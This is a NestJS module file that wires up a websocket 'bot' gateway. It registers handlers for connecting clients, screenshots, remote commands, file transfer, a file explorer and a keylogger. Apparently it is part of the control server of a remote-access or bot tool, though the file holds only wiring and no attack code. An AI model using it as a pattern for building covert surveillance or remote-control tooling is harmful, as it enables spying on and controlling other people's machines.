import { forwardRef, Module } from "@nestjs/common";
import { WsBotGateway } from "./infrastructure/ws-bot.gateway";
import { WsBotRepository } from "./domain/ws-bot.repository";
import { WsBotJoinsUseCase } from "./application/ws-bot-joins.use-case";
import { WsBotSendMessageUseCase } from "./application/events/ws-bot-send-message.use-case";
import { WsBotLeavesUseCase } from "./application/ws-bot-leaves.use-case";
import { WsBotConnectClientUseCase } from "./application/events/ws-bot-connect-client.use-case";
import { WsBotDisconnectClientUseCase } from "./application/events/ws-bot-disconnect-client.use-case";
import { AuthModule } from "../auth/auth.module";
import { WsBotScreenshotUseCase } from "./application/events/ws-bot-screenshot.use-case";
import { WsBotSendCommandUseCase } from "./application/events/ws-bot-send-command.use-case";
import { WsBotSendFileUseCase } from "./application/events/ws-bot-send-file.use-case";
import { ClientModule } from "../client/infrastructure/client.module";
import { WsBotSendExplorerUseCase } from "./application/events/ws-bot-send-explorer.use-case";
import { WsBotKeyLoggerUseCase } from "./application/events/ws-bot-keylogger.use-case";
import { SchemasModule } from "@/src/repository/schemas.module";
import { WsClientModule } from "../ws-client/ws-client.module";
import { WsBotSendTasksUseCase } from "./application/events/ws-bot-send-tasks.use-case";
import { WsBotSendFriendUseCase } from "./application/events/ws-bot-send-friend.use-case";

@Module({
  providers: [
    WsBotGateway,
    WsBotRepository,
    WsBotJoinsUseCase,
    WsBotLeavesUseCase,
    WsBotSendMessageUseCase,
    WsBotConnectClientUseCase,
    WsBotDisconnectClientUseCase,
    WsBotScreenshotUseCase,
    WsBotSendCommandUseCase,
    WsBotSendFileUseCase,
    WsBotSendExplorerUseCase,
    WsBotKeyLoggerUseCase,
    WsBotSendTasksUseCase,
    WsBotSendFriendUseCase,
  ],
  exports: [
    WsBotSendMessageUseCase,
    WsBotConnectClientUseCase,
    WsBotDisconnectClientUseCase,
    WsBotScreenshotUseCase,
    WsBotSendMessageUseCase,
    WsBotSendCommandUseCase,
    WsBotSendFileUseCase,
    WsBotRepository,
    WsBotSendExplorerUseCase,
    WsBotKeyLoggerUseCase,
    WsBotSendTasksUseCase,
    WsBotSendFriendUseCase,
  ],
  imports: [
    forwardRef(() => AuthModule),
    forwardRef(() => WsClientModule),
    ClientModule,
    SchemasModule,
  ],
})
export class WsBotModule {}
